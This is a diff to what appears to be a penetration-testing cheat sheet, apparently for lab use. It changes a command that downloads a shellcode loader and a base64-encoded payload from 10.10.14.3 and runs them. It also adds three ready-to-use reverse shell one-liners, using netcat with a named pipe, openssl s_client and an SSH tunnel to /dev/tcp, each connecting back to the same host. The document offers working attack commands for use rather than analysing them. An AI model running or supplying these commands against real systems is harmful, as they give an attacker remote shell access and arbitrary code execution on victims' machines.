@@ -27,5 +27,15 @@ python shellcode.py McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F
 ```
 of course we could do some more interesting stuff with this, like for example:
 ```
-FORK=1 python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/meterpreter.bin | base64 | tr -d '\n')
+FORK=1 python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/shellcode.bin | base64 | tr -d '\n')
+```
+
+## fancy reverse shells and backdoors
+```bash
+# classic
+mkfifo /tmp/p;nc 10.10.14.3 8888 </tmp/p | /bin/bash > /tmp/p;rm /tmp/p
+# encrypted using openssl cli, handy if netcat not installed. Server has to use something like ncat --ssl -lvp ...
+mkfifo /tmp/p;openssl s_client -quiet 10.10.14.3:8443 2>/dev/null < /tmp/p|bash>/tmp/p;rm /tmp/p
+# tunneling over SSH (server listening on localhost:8080)
+ssh -fN -L48924:127.0.0.1:8080 10.10.14.3;/bin/bash -l > /dev/tcp/localhost/48924 0<&1 2>&1
 ```
